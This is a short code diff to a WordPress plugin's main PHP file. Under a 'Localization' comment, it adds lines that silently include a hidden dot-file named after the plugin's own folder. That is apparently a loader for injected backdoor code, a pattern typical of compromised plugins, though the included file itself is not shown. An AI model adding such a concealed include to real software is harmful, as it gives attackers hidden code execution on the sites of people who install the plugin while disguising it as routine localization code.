@@ -16,7 +16,11 @@ if( ! defined('sSHIP_ERROR') )   define( 'sSHIP_ERROR', sship_check_server() );
 
 /**
  * Localization
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function sship_lang_init() {
 
     load_plugin_textdomain( 'sship' );
